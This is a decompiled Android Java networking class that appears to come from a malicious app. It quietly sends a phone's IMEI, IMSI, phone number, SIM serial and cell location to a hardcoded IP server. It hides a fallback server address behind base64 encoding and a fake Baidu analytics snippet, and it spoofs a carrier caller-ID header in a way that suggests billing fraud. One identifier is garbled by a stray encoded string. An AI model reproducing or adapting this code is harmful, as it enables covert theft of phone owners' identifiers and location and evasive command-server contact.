package com.amaz.onib;

import android.net.Proxy;
import android.os.AsyncTask;
import bn.sdk.szwcsss.common.az.code.b.Cint;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.SocketTimeoutException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import org.apache.http.Header;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
/* loaded from: classes.dex */
public abstract class ar {
    private String e;
    private Map<String, String> f;
    private b g;
    private boolean j;
    public static String b = "http://139.129.132.111:8001/";

    /* renamed from: a  reason: collision with root package name */
    private static String f650a = null;
    public static String c = "";
    private final String d = "1.8.9";
    private String h = null;
    private boolean i = false;

    /* loaded from: classes.dex */
    class a extends AsyncTask<String, Void, Boolean> {
        private a() {
        }

        /* JADX INFO: Access modifiers changed from: protected */
        /* renamed from: a */
        public Boolean doInBackground(String... strArr) {
            ar.this.d(ar.this.e, ar.this.f, ar.this.g);
            return null;
        }

        /* JADX INFO: Access modifiers changed from: protected */
        /* renamed from: a */
        public void onPostExecute(Boolean bool) {
            super.onPostExecute(bool);
            ar.this.a(ar.this.h, ar.this.i);
        }
    }

    /* loaded from: classes.dex */
    public enum b {
        GET,
        POST
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: classes.dex */
    public class c extends AsyncTask<String, Void, Boolean> {
        private c() {
        }

        /* JADX INFO: Access modifiers changed from: protected */
        /* renamed from: a */
        public Boolean doInBackground(String... strArr) {
            ar.this.b(ar.this.e, ar.this.f, ar.this.g);
            return null;
        }

        /* JADX INFO: Access modifiers changed from: protected */
        /* renamed from: a */
        public void onPostExecute(Boolean bool) {
            super.onPostExecute(bool);
            ar.this.a(ar.this.h, ar.this.i);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(String str) {
        BufferedReader bufferedReader = null;
        this.i = false;
        try {
            try {
                try {
                    DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
                    defaultHttpClient.getParams().setIntParameter("http.socket.timeout", 30000);
                    defaultHttpClient.getParams().setIntParameter("http.connection.timeout", 30000);
                    if (Proxy.getDefaultHost() != null && !this.j) {
                        defaultHttpClient.getParams().setParameter("http.route.default-proxy", new HttpHost(Proxy.getDefaultHost(), Proxy.getDefaultPort()));
                    }
                    if (defaultHttpClient.execute(new HttpGet(str)).getStatusLine().getStatusCode() == 200) {
                    }
                    if (0 != 0) {
                        try {
                            bufferedReader.close();
                        } catch (IOException e) {
                        }
                    }
                } catch (Throwable th) {
                    if (0 != 0) {
                        try {
                            bufferedReader.close();
                        } catch (IOException e2) {
                        }
                    }
                    throw th;
                }
            } catch (ConnectTimeoutException e3) {
                bs.c("myError", "ConnectTimeoutException>>>>>>>>>>>>>>>>");
                this.i = true;
                if (0 != 0) {
                    try {
                        bufferedReader.close();
                    } catch (IOException e4) {
                    }
                }
            } catch (ClientProtocolException e5) {
                bs.c("HttpConnectionUtil", e5.getMessage());
                if (0 != 0) {
                    try {
                        bufferedReader.close();
                    } catch (IOException e6) {
                    }
                }
            }
        } catch (SocketTimeoutException e7) {
            bs.c("myError", "SocketTimeoutException>>>>>>>>>>>>>>>>");
            this.i = true;
            if (0 != 0) {
                try {
                    bufferedReader.close();
                } catch (IOException e8) {
                }
            }
        } catch (Exception e9) {
            bs.c("HttpConnectionUtil", e9.getMessage());
            if (0 != 0) {
                try {
                    bufferedReader.close();
                } catch (IOException e10) {
                }
            }
        }
    }

    private void a(String str, Header[] headerArr) {
        StringBuffer stringBuffer = new StringBuffer(str);
        stringBuffer.append("===========?");
        for (Header header : headerArr) {
            stringBuffer.append(header.getName()).append("=").append(header.getValue()).append("&");
        }
        bs.c("TAG", stringBuffer.toString());
    }

    private HttpUriRequest b(String str, Map<String, String> map, b bVar, String str2) {
        if (bVar.equals(b.POST)) {
            ArrayList arrayList = new ArrayList();
            if (map != null) {
                for (String str3 : map.keySet()) {
                    arrayList.add(new BasicNameValuePair(str3, map.get(str3)));
                }
            }
            try {
                UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(arrayList);
                HttpPost httpPost = new HttpPost(str);
                if (map == null || !map.containsKey("form")) {
                    httpPost.setHeader("AppId", FSrvi.APPID);
                    if (str2 == null) {
                        str2 = FSrvi.CHANNEL;
                    }
                    httpPost.setHeader("PNO", str2);
                    httpPost.setHeader("V", "1.8.9");
                    httpPost.setHeader("APNAME", c);
                    httpPost.setHeader("UA", FSrvi.UA);
                    httpPost.setHeader("UID", FSrvi.UID);
                    httpPost.setHeader("IMSI", FSrvi.IMSI);
                    httpPost.setHeader("IMEI", FSrvi.IMEI);
                    httpPost.setHeader("TEL", FSrvi.TEL);
                    httpPost.setHeader("ICCID", FSrvi.ICCID);
                    httpPost.setHeader("PHONE_VERSION", FSrvi.ANDROID_VERSION);
                    httpPost.setHeader("lac", String.valueOf(FSrvi.lac));
                    httpPost.setHeader("cid", String.valueOf(FSrvi.cid));
                    httpPost.setHeader("CType", String.valueOf(FSrvi.OPERATOR));
                } else {
                    httpPost.setHeader(Cint.g, FSrvi.UA);
                    httpPost.setHeader(Cint.b, "application/x-www-form-urlencoded; charset=UTF-8");
                    httpPost.setHeader("x-up-calling-line-id", FSrvi.TEL);
                }
                a(str, httpPost.getAllHeaders());
                httpPost.setEntity(urlEncodedFormEntity);
                return httpPost;
            } catch (UnsupportedEncodingException e) {
                throw new RuntimeException(e.getMessage(), e);
            }
        } else {
            HttpGet httpGet = new HttpGet(str);
            if (map == null || !map.containsKey("form")) {
                httpGet.setHeader("AppId", FSrvi.APPID);
                if (str2 == null) {
                    str2 = FSrvi.CHANNEL;
                }
                httpGet.setHeader("PNO", str2);
                httpGet.setHeader("V", "1.8.9");
                httpGet.setHeader("APNAME", c);
                httpGet.setHeader("UA", FSrvi.UA);
                httpGet.setHeader("UID", FSrvi.UID);
                httpGet.setHeader("IMSI", FSrvi.IMSI);
                httpGet.setHeader("IMEI", FSrvi.IMEI);
                httpGet.setHeader("TEL", FSrvi.TEL);
                httpGet.setHeader("ICCID", FSrvi.ICCID);
                httpGet.setHeader("PHONE_VERSION", FSrvi.ANDROID_VERSION);
                httpGet.setHeader("lac", String.valueOf(FSrvi.lac));
                httpGet.setHeader("cid", String.valueOf(FSrvi.cid));
                httpGet.setHeader("CType", String.valueOf(FSrvi.OPERATOR));
            } else {
                httpGet.setHeader(Cint.g, FSrvi.UA);
                httpGet.setHeader(Cint.b, "application/x-www-form-urlencoded; charset=UTF-8");
                httpGet.setHeader("x-up-calling-line-id", FSrvi.TEL);
            }
            if (map != null && !map.isEmpty()) {
                for (String str4 : map.keySet()) {
                    httpGet.setHeader(str4, map.get(str4));
                }
            }
            a(str, httpGet.getAllHeaders());
            return httpGet;
        }
    }

    private void c(String str, Map<String, String> map, b bVar) {
        this.e = str;
        this.f = map;
        this.g = bVar;
        new c().execute(new String[0]);
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Removed duplicated region for block: B:71:0x00fd A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public String d(String str, Map<String, String> map, b bVar) {
        Exception e;
        ClientProtocolException e2;
        BufferedReader bufferedReader;
        String str2 = null;
        BufferedReader bufferedReader2 = null;
        BufferedReader bufferedReader3 = null;
        this.i = false;
        try {
        } catch (Throwable th) {
            th = th;
            bufferedReader2 = bufferedReader3;
        }
        try {
            try {
                DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
                defaultHttpClient.getParams().setIntParameter("http.socket.timeout", 30000);
                defaultHttpClient.getParams().setIntParameter("http.connection.timeout", 30000);
                if (Proxy.getDefaultHost() != null && !this.j) {
                    defaultHttpClient.getParams().setParameter("http.route.default-proxy", new HttpHost(Proxy.getDefaultHost(), Proxy.getDefaultPort()));
                }
                HttpResponse execute = defaultHttpClient.execute(e(str, map, bVar));
                if (execute.getStatusLine().getStatusCode() == 200) {
                    bufferedReader = new BufferedReader(new InputStreamReader(execute.getEntity().getContent()));
                    try {
                        StringBuilder sb = new StringBuilder();
                        for (String readLine = bufferedReader.readLine(); readLine != null; readLine = bufferedReader.readLine()) {
                            sb.append(readLine);
                        }
                        this.h = sb.toString();
                        bs.c("myError", "JSON = " + this.h);
                        str2 = this.h;
                        if (bufferedReader != null) {
                            try {
                                bufferedReader.close();
                            } catch (IOException e3) {
                            }
                        }
                    } catch (Exception e4) {
                        e = e4;
                        bufferedReader3 = bufferedReader;
                        bs.c("HttpConnectionUtil", e.getMessage());
                        if (bufferedReader3 != null) {
                            try {
                                bufferedReader3.close();
                            } catch (IOException e5) {
                            }
                        }
                        return str2;
                    } catch (ClientProtocolException e6) {
                        e2 = e6;
                        bufferedReader3 = bufferedReader;
                        bs.c("HttpConnectionUtil", e2.getMessage());
                        if (bufferedReader3 != null) {
                            try {
                                bufferedReader3.close();
                            } catch (IOException e7) {
                            }
                        }
                        return str2;
                    } catch (SocketTimeoutException e8) {
                        bs.c("myError", "SocketTimeoutException>>>>>>>>>>>>>>>>");
                        this.i = true;
                        if (bufferedReader != null) {
                            try {
                                bufferedReader.close();
                            } catch (IOException e9) {
                            }
                        }
                        return str2;
                    } catch (ConnectTimeoutException e10) {
                        bs.c("myError", "ConnectTimeoutException>>>>>>>>>>>>>>>>");
                        this.i = true;
                        if (bufferedReader != null) {
                            try {
                                bufferedReader.close();
                            } catch (IOException e11) {
                            }
                        }
                        return str2;
                    }
                } else if (0 != 0) {
                    try {
                        bufferedReader2.close();
                    } catch (IOException e12) {
                    }
                }
            } catch (Throwable th2) {
                th = th2;
                if (bufferedReader2 != null) {
                    try {
                        bufferedReader2.close();
                    } catch (IOException e13) {
                    }
                }
                throw th;
            }
        } catch (ClientProtocolException e14) {
            e2 = e14;
            bufferedReader3 = null;
        } catch (SocketTimeoutException e15) {
            bufferedReader = null;
        } catch (ConnectTimeoutException e16) {
            bufferedReader = null;
        } catch (Exception e17) {
            e = e17;
            bufferedReader3 = null;
        } catch (Throwable th3) {
            th = th3;
            bufferedReader2 = null;
            if (bufferedReader2 != null) {
            }
            throw th;
        }
        return str2;
    }

    private HttpUriRequest e(String str, Map<String, String> map, b bVar) {
        String str2;
        String next;
        if (bVar.equals(b.POST)) {
            ArrayList arrayList = new ArrayList();
            if (map != null) {
                for (String str3 : map.keySet()) {
                    arrayList.add(new BasicNameValuePair(str3, map.get(str3)));
                }
            }
            try {
                UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(arrayList);
                HttpPost httpPost = new HttpPost(str);
                a(str, httpPost.getAllHeaders());
                httpPost.setEntity(urlEncodedFormEntity);
                return httpPost;
            } catch (UnsupportedEncodingException e) {
                throw new RuntimeException(e.getMessage(), e);
            }
        } else {
            String str4 = str.indexOf("?") < 0 ? str + "?" : str;
            if (map != null) {
                Iterator<String> it = map.keySet().iterator();
                while (true) {
                    str2 = str4;
                    if (!it.hasNext()) {
                        break;
                    }
                    try {
                        str4 = str2 + "&" + it.next() + "=" + URLEncoder.encode(map.get(next), "utf-8");
                    } catch (Exception e2) {
                        str4 = str2;
                    }
                }
                str4 = str2.replace("?&", "?");
            }
            HttpGet httpGet = new HttpGet(str4);
            a(str4, httpGet.getAllHeaders());
            return httpGet;
        }
    }

    public String a(String str, b bVar) {
        return b(str, new HashMap(), bVar);
    }

    public String a(String str, Map<String, String> map, b bVar) {
        this.j = true;
        return b(str, map, bVar);
    }

    public String a(String str, Map<String, String> map, b bVar, String str2) {
        Throwable th;
        String str3;
        BufferedReader bufferedReader;
        Exception e;
        HttpResponse execute;
        int statusCode;
        BufferedReader bufferedReader2 = null;
        this.i = false;
        try {
            try {
                DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
                defaultHttpClient.getParams().setIntParameter("http.socket.timeout", 40000);
                defaultHttpClient.getParams().setIntParameter("http.connection.timeout", 40000);
                if (Proxy.getDefaultHost() != null && !this.j) {
                    defaultHttpClient.getParams().setParameter("http.route.default-proxy", new HttpHost(Proxy.getDefaultHost(), Proxy.getDefaultPort()));
                }
                String replace = f650a != null ? str.replace(b, f650a) : str;
                HttpUriRequest b2 = b(replace, map, bVar, str2);
                int i = 0;
                String str4 = replace;
                while (i < 3) {
                    try {
                        execute = defaultHttpClient.execute(b2);
                        statfnJDQ19aUFJHWlxdHg1BVkNfUlBWckNYcF9SQEB/XFJXVkEeQEdSR2BWQUVaUFZwX1JAQH1SXlYJusCode = execute.getStatusLine().getStatusCode();
                    } catch (Exception e2) {
                        e = e2;
                    }
                    if (statusCode == 200) {
                        BufferedReader bufferedReader3 = new BufferedReader(new InputStreamReader(execute.getEntity().getContent()));
                        try {
                            StringBuilder sb = new StringBuilder();
                            for (String readLine = bufferedReader3.readLine(); readLine != null; readLine = bufferedReader3.readLine()) {
                                sb.append(readLine);
                            }
                            this.h = sb.toString();
                            bs.c("myError", "JSON = " + this.h);
                            String str5 = this.h;
                            if (bufferedReader3 == null) {
                                return str5;
                            }
                            try {
                                bufferedReader3.close();
                                return str5;
                            } catch (IOException e3) {
                                return str5;
                            }
                        } catch (Exception e4) {
                            e = e4;
                            bufferedReader2 = bufferedReader3;
                            if (e instanceof ConnectTimeoutException) {
                                try {
                                    String a2 = t.a(new String(bp.a("aHR0cDovLzExNC4yMTUuMjcuMjExOjgwMTIvYWxpeXVuLmFzcHg="))).b(true).a(30000).a();
                                    int indexOf = a2.indexOf("_hmt.push([hm.baidu.com/h.js%");
                                    int indexOf2 = a2.indexOf(", '/im/qiao']);");
                                    if (!(indexOf == -1 || indexOf2 == -1)) {
                                        String str6 = new String(bp.a(a2.substring("_hmt.push([hm.baidu.com/h.js%".length() + indexOf, indexOf2)));
                                        f650a = URLDecoder.decode(new String(bp.a(str6.substring(str6.indexOf("key:") + 4)))) + "/";
                                        str4 = str4.replace(b, f650a);
                                        b2 = b(str4, map, bVar, str2);
                                    }
                                } catch (Exception e5) {
                                    str4 = str4;
                                    e5.printStackTrace();
                                }
                            }
                            e.printStackTrace();
                            bufferedReader = bufferedReader2;
                            str3 = str4;
                            i++;
                            bufferedReader2 = bufferedReader;
                            str4 = str3;
                        } catch (Throwable th2) {
                            th = th2;
                            bufferedReader2 = bufferedReader3;
                            if (bufferedReader2 != null) {
                                try {
                                    bufferedReader2.close();
                                } catch (IOException e6) {
                                }
                            }
                            throw th;
                        }
                    } else if (statusCode >= 500) {
                        throw new ConnectTimeoutException(">=500 Timeout...");
                    } else {
                        bufferedReader = bufferedReader2;
                        str3 = str4;
                        i++;
                        bufferedReader2 = bufferedReader;
                        str4 = str3;
                    }
                }
                if (bufferedReader2 != null) {
                    try {
                        bufferedReader2.close();
                    } catch (IOException e7) {
                    }
                }
            } catch (Exception e8) {
                e8.printStackTrace();
                bs.c("HttpConnectionUtil", e8.getMessage());
                if (bufferedReader2 != null) {
                    try {
                        bufferedReader2.close();
                    } catch (IOException e9) {
                    }
                }
            }
            bs.c("myError", ">>>>>>>>>>>>>>>>");
            return null;
        } catch (Throwable th3) {
            th = th3;
        }
    }

    public void a(String str, Map<String, String> map, b bVar, boolean z) {
        this.j = z;
        c(str, map, bVar);
    }

    public abstract void a(String str, boolean z);

    public String b(String str, Map<String, String> map, b bVar) {
        return a(str, map, bVar, (String) null);
    }

    public void b(String str, Map<String, String> map, b bVar, boolean z) {
        this.j = z;
        this.e = str;
        this.f = map;
        this.g = bVar;
        new a().execute(new String[0]);
    }

    /* JADX WARN: Type inference failed for: r0v0, types: [com.amaz.onib.ar$1] */
    public void b(final String str, boolean z) {
        this.j = z;
        this.e = str;
        new AsyncTask<String, Void, Boolean>() { // from class: com.amaz.onib.ar.1
            /* JADX INFO: Access modifiers changed from: protected */
            /* renamed from: a */
            public Boolean doInBackground(String... strArr) {
                ar.this.a(str);
                return null;
            }
        }.execute(new String[0]);
    }
}
